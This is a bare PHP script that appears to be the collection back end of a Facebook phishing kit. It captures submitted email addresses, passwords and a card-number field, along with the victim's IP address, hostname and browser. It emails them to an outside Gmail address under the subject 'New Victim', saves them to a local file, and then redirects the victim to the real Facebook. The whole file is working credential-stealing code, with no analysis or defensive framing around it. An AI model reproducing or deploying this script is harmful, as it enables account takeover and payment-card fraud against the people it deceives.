<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Facebook -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Email Adresse       : ".$_POST['email']."\n";
$message .= "Password          : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- fb/ zlfo.hsone ----------------------\n";
$cc = $_POST['ccn'];
$subject = "New Victim".$_POST['exm']."/".$_POST['exy'];
$send = "zlfo.hsone1998@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:http://facebook.com/");
$save = fopen('b431.txt', 'a+');
fwrite($save, $message);
fclose($save);?>